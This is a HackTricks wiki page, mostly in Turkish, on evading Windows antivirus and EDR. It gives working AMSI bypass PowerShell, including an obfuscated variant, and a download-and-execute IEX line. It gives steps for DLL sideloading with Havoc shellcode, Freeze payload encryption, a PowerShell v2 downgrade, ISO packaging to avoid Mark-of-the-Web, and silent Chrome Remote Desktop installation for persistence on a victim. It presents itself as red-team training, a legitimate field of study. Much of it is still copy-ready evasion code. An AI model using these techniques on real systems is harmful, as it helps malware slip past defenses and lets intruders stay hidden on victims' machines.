# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa şunun tarafından yazıldı** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Metodolojisi**

Şu anda AV'ler bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR'ler için behavioural analysis.

### **Static detection**

Static detection, bir binary veya script içindeki bilinen kötü amaçlı string'leri veya byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (örn. file description, company name, digital signatures, icon, checksum, vb.) gerçekleştirilir. Bu, bilinen public araçları kullanmanın sizi daha kolay yakalayabileceği anlamına gelir, çünkü muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmişlerdir. Bu tür tespitin aşılmasının birkaç yolu vardır:

- **Encryption**

Binary'yi şifrelerseniz AV'nin programınızı tespit etmesinin bir yolu olmaz, ancak programı memory'de decrypt edip çalıştıracak bir loader'a ihtiyacınız olur.

- **Obfuscation**

Bazen yapmanız gereken tek şey binary'nizdeki veya script'inizdeki bazı string'leri değiştirmek olabilir, ancak neyi obfuskasyona uğratmaya çalıştığınıza bağlı olarak bu zaman alıcı bir iş olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmayacaktır, ancak bu çok zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender'ın static detection'ına karşı kontrol etmenin iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)'tir. Temelde dosyayı birden çok segmente ayırır ve ardından Defender'dan her birini ayrı ayrı taramasını ister; böylece binary'nizde işaretlenen string veya byte'ların tam olarak hangileri olduğunu söyleyebilir.

Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)'ini şiddetle tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı aktiviteyi izlemesidir (örn. tarayıcı şifrelerinizi decrypt etmeye/okumaya çalışmak, LSASS üzerinde minidump almak vb.). Bu kısım biraz daha zor olabilir, ancak sandbox'lardan kaçınmak için yapabileceğiniz birkaç şey var.

- **Sleep before execution** Uygulama şekline bağlı olarak, dynamic analysis'ı atlatmanın harika bir yolu olabilir. AV'lerin dosyaları taramak için kullanıcının iş akışını kesmemek adına çok kısa süreleri vardır, bu yüzden uzun beklemeler analizleri bozabilir. Sorun şu ki, birçok AV'nin sandbox'ı uygulama şekline bağlı olarak bu beklemeyi atlayabilir.
- **Checking machine's resources** Genellikle Sandboxes'ın çalışma için çok az kaynağı olur (örn. < 2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada çok yaratıcı olabilirsiniz; örneğin CPU'nun sıcaklığını veya fan hızlarını kontrol etmek gibi—her şey sandbox içinde uygulanmış olmayacaktır.
- **Machine-specific checks** Eğer hedeflediğiniz kullanıcının workstation'ı "contoso.local" domainine bağlıysa, bilgisayarın domain'ini belirttiğinizle eşleşip eşleşmediğini kontrol edebilirsiniz; eşleşmiyorsa programınızı sonlandırabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı; bu yüzden kötü amaçlı yazılımınızda çalıştırmadan önce bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa Defender'ın sandbox'ı içindesiniz demektir ve programınızı sonlandırabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı bazı gerçekten iyi ipuçları [@mgeeky](https://twitter.com/mariuszbit)'ten

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu yazıda daha önce söylediğimiz gibi, **public tools** eninde sonunda **tespit edilir**, bu yüzden kendinize şunu sormalısınız:

Örneğin LSASS'i dump etmek istiyorsanız, gerçekten **mimikatz** kullanmanız mı gerekiyor? Yoksa LSASS'i dump eden daha az bilinen başka bir proje kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. Örnek olarak mimikatz, muhtemelen AV'ler ve EDR'ler tarafından en çok işaretlenen kötü amaçlı yazılımlardan biridir; proje kendi başına çok havalı olsa da, AV'leri atlatmak için onunla çalışmak da kabus gibidir — bu yüzden başarmaya çalıştığınız şey için alternatiflere bakın.

> [!TIP]
> Payload'larınızı evasion için değiştirirken, Defender'da **automatic sample submission'ı kapatmayı** unutmayın, ve lütfen ciddi olarak, uzun vadede evasion hedefiniz varsa **DO NOT UPLOAD TO VIRUSTOTAL**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, bunu bir VM'e kurun, automatic sample submission'ı kapatmayı deneyin ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda, her zaman **evade etmek için DLL'leri kullanmayı önceliklendirin**; benim deneyimime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir, bu yüzden bazı durumlarda tespitten kaçınmak için kullanılması çok basit bir hiledir (elbette payload'ınızın bir DLL olarak çalıştırılmasının bir yolu varsa).

Bu görselde görebileceğimiz gibi, Havoc'tan bir DLL Payload'un antiscan.me'de detection oranı 4/26 iken EXE payload'un oranı 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Şimdi DLL dosyalarıyla çok daha gizli olmanızı sağlayacak bazı numaralar göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading** loader tarafından kullanılan DLL arama sırasından faydalanır; hedef uygulamayı ve kötü amaçlı payload(ları) yan yana koyarak.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e yatkın programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılayacaktır.

Şiddetle tavsiye ederim: **explore DLL Hijackable/Sideloadable programs yourself**. Bu teknik doğru uygulandığında oldukça gizlidir, ancak kamuya açık bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Sadece bir programın yüklemesini beklediği isimde bir kötü amaçlı DLL yerleştirmek, payload'unuzu çalıştırmayacaktır; çünkü program o DLL içinde belirli fonksiyonları bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying** bir programın proxy (ve kötü amaçlı) DLL'den yaptığı çağrıları orijinal DLL'e iletir; böylece programın işlevselliği korunur ve payload'unuzun yürütülmesini yönetebilir.

Bu amaçla [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilmiş olarak kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve orijinal yeniden adlandırılmış DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile kodlanmış) hem de proxy DLL'imiz [antiscan.me](https://antiscan.me) üzerinde 0/26 tespit oranına sahip! Bunu bir başarı olarak nitelendiririm.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında daha fazla bilgi edinmek için [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) ve ayrıca [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi şiddetle tavsiye ederim.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i shellcode'unuzu gizlice yükleyip çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece bir kedi-fare oyunudur; bugün işe yarayan yarın tespit edilebilir, bu yüzden yalnızca tek bir araca güvenmeyin — mümkünse birden fazla evasion tekniğini zincirlemeye çalışın.

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturuldu. Başlangıçta, AV'ler yalnızca **files on disk** tarayabiliyordu; bu yüzden payload'ları **directly in-memory** olarak çalıştırabiliyorsanız, AV bunu engelleyemiyordu çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Antivirüs çözümlerinin script davranışını, script içeriğini hem unencrypted hem de unobfuscated bir biçimde açığa çıkararak incelemesine izin verir.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırmak Windows Defender üzerinde aşağıdaki uyarıyı üretecektir.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Dikkat edin: `amsi:` öne ekleniyor ve ardından scriptin çalıştığı yürütülebilir dosyanın yolu geliyor; bu durumda powershell.exe.

Hiçbir dosyayı diske yazmadık, ama AMSI yüzünden hâlâ in-memory olarak yakalandık.

Dahası, **.NET 4.8**'den itibaren C# kodu da AMSI tarafından taranmaktadır. Bu, `Assembly.Load(byte[])` ile yapılan in-memory yüklemelerini bile etkiler. Bu yüzden AMSI'den kaçmak istiyorsanız, in-memory yürütme için daha düşük .NET sürümleri (ör. 4.7.2 veya altı) kullanmanız önerilir.

AMSI'den kaçmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespitlerle çalıştığından, yüklemeye çalıştığınız scriptleri değiştirmek tespitten kaçınmak için iyi bir yol olabilir.

Ancak AMSI, scriptleri çok katmanlı olsalar bile unobfuscate etme yeteneğine sahiptir; bu nedenle obfuscation, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu, tespitten kaçmayı o kadar da basit yapmaz. Yine de bazen sadece birkaç değişken ismini değiştirmek yeterli olur, yani ne kadar işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (aynı zamanda cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulandığından, yönetici olmayan bir kullanıcı olarak çalışırken bile buna müdahale etmek mümkündür. AMSI'nin bu uygulama hatası nedeniyle araştırmacılar AMSI taramasından kaçmak için birden fazla yöntem bulmuşlardır.

**Hata Zorlamak**

AMSI başlatılmasının başarısız olmasını zorlamak (amsiInitFailed), mevcut süreç için hiçbir taramanın başlatılmamasıyla sonuçlanır. Bunu ilk olarak [Matt Graeber](https://twitter.com/mattifestation) açıkladı ve Microsoft daha geniş kullanımını önlemek için bir signature geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Geçerli powershell süreci için AMSI'yi kullanılamaz hâle getirmek yalnızca bir satır powershell kodu gerekiyordu. Bu satır elbette AMSI tarafından işaretlendi; bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekli.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Lütfen daha ayrıntılı açıklama için [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Tespit edilen imzayı kaldır**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AMSI kullanan AV/EDR ürünleri**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Powershell sürüm 2'yi kullanın**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu, denetleme ve sorun giderme amaçları için faydalı olabilir, ancak algılamadan kaçmak isteyen saldırganlar için de **bir sorun olabilir**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Use Powershell version 2**: PowerShell version 2 kullanırsanız, AMSI yüklenmez, böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanarak savunmasız bir powershell başlatın (bu, Cobal Strike'dan `powerpick`'in kullandığı şeydir).


## Obfuscation

> [!TIP]
> Several obfuscation techniques verileri encrypting ile şifrelemeye dayanır; bu, ikili dosyanın entropisini artırır ve AVs ile EDRs'in tespitini kolaylaştırır. Buna dikkat edin ve belki yalnızca hassas veya gizlenmesi gereken kod bölümlerine encryption uygulayın.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profilini seçer  
• de4dot control-flow flattening'i geri alır, orijinal namespace'leri, sınıfları ve değişken isimlerini geri getirir ve sabit string'leri deşifre eder.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra opak sarmalayıcı fonksiyonlar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'larını görmelisiniz.

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

Manual clean-up – ortaya çıkan binary'i dnSpy altında çalıştırın, gerçek payload'ı bulmak için büyük Base64 blob'ları veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Çoğunlukla malware bunu `<Module>.byte_0` içinde başlatılmış TLV-encoded byte array olarak depolar.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, yazılım güvenliğini artırmak için code obfuscation ve tamper-proofing sağlayabilen açık kaynaklı bir LLVM fork'u sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, derleme zamanında herhangi bir dış araç kullanmadan ve derleyiciyi değiştirmeden `C++11/14` dilini kullanarak obfuscated code üretmenin nasıl yapılacağını göstermektedir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming çerçevesi tarafından üretilen obfuscated operations katmanı ekleyerek, uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli farklı pe dosyalarını obfuscate edebilen x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele yürütülebilir dosyalar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan ve LLVM-supported languages için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek programı assembly code seviyesinde obfuscate eder ve normal kontrol akışı algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor mevcut EXE/DLL'leri shellcode'a dönüştürebilir ve sonra bunları yükleyebilir.

## SmartScreen & MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcının potansiyel olarak kötü amaçlı uygulamaları çalıştırmasını engellemeye yönelik bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen esas olarak bir reputation-based yaklaşımı ile çalışır; bu da nadiren indirilen uygulamaların SmartScreen'i tetikleyeceği, böylece son kullanıcıyı uyarıp dosyanın çalıştırılmasını engelleyeceği anlamına gelir (dosya yine de More Info -> Run anyway tıklanarak çalıştırılabilir).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS'yi kontrol etme.</p></figcaption></figure>

> [!TIP]
> Microsoft Defender SmartScreen tarafından tetiklenmemesi açısından, bir **trusted** signing certificate ile imzalanmış yürütülebilir dosyaların SmartScreen'i **won't trigger SmartScreen** olduğunu not etmek önemlidir.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları bir ISO gibi bir konteyner içine paketlemektir. Bunun nedeni, Mark-of-the-Web (MOTW)'ün **non NTFS** hacimlere uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is a powerful logging mechanism in Windows that allows applications and system components to **log events**. However, it can also be used by security products to monitor and detect malicious activities.

AMSI'nin devre dışı bırakılmasına (atlatılmasına) benzer şekilde, kullanıcı alanı sürecinin **`EtwEventWrite`** fonksiyonunun herhangi bir olay kaydetmeden hemen dönmesini sağlamak da mümkündür. Bu, bellekte fonksiyonun anında dönüş yapacak şekilde patch'lenmesiyle yapılır; böylece ilgili süreç için ETW kaydı fiilen devre dışı bırakılmış olur.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# ikili dosyalarının belleğe yüklenmesi uzun zamandır bilinen bir yöntemdir ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok iyi bir yoldur.

Payload disk'e dokunmadan doğrudan belleğe yükleneceği için tüm süreç için sadece AMSI'yi patch'lemeyi düşünmemiz gerekecek.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) zaten C# assembly'lerini doğrudan bellekte çalıştırma yeteneği sağlıyor, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, yeni bir fedakâr süreç (sacrificial process) başlatmayı, post-exploitation kötü amaçlı kodunuzu bu yeni sürece enjekte etmeyi, kodu çalıştırmayı ve iş bitince yeni süreci sonlandırmayı içerir. Bunun hem faydaları hem de dezavantajları vardır. Fork and run yönteminin faydası, yürütmenin Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation işlemlerimizde bir şeyler ters gider veya yakalanırsa implantımızın hayatta kalma ihtimalinin **çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise Behavioural Detections tarafından yakalanma ihtimalimizin **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation kötü amaçlı kodu **kendi sürecine** enjekte etmektir. Böylece yeni bir süreç oluşturmak ve AV tarafından taranmak zorunda kalmazsınız, ancak dezavantajı payload'unuzun çalışması sırasında bir şeyler ters giderse beacon'ınızı kaybetme ihtimalinin **çok daha yüksek** olmasıdır; çünkü süreç çökebilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla okumak isterseniz, şu makaleye bakın [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'u ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly'lerini ayrıca **PowerShell** üzerinden de yükleyebilirsiniz; bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Diğer Programlama Dillerini Kullanma

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), saldırıya uğramış makineye saldırganın kontrolündeki SMB paylaşımına kurulu yorumlayıcı ortamına erişim vererek diğer diller kullanarak kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki Interpreter ikililerine ve ortama erişime izin vererek, bu dillerde arbitrar kodu hedef makinenin belleği içinde çalıştırabilirsiniz.

Repo şunu belirtiyor: Defender hala script'leri tarıyor ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak** için daha fazla esneklik elde ediyoruz. Bu dillerde rastgele, obfuskasyonsuz reverse shell script'leriyle yapılan testler başarılı oldu.

## TokenStomping

Token stomping, saldırganın bir erişim token'ını veya bir EDR ya da AV gibi bir güvenlik ürünü üzerinde manipülasyon yapmasına izin veren bir tekniktir; böylece ayrıcalıkları düşürerek sürecin ölmemesini ama kötü amaçlı aktiviteleri kontrol etme izinlerine sahip olmamasını sağlar.

Bunu önlemek için Windows, güvenlik süreçlerinin token'larına dış süreçlerin erişim sağlamasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Bu blog yazısında [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, bir kurbanın PC'sine Chrome Remote Desktop'ı deploy etmek ve onu ele geçirip kalıcılık sağlamak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH"e tıklayın ve Windows için MSI dosyasına tıklayarak MSI dosyasını indirin.
2. Kurulumu hedefte sessizce çalıştırın (admin gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Sihirbaz sizden yetki isteyecek; devam etmek için Authorize butonuna tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Not: pin parametresi GUI kullanmadan pin belirlemeyi sağlar.)

## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetri kaynağını dikkate almak gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Her karşılaştığınız ortamın kendi güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine dair fikir edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından verilen bu konuşmayı izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

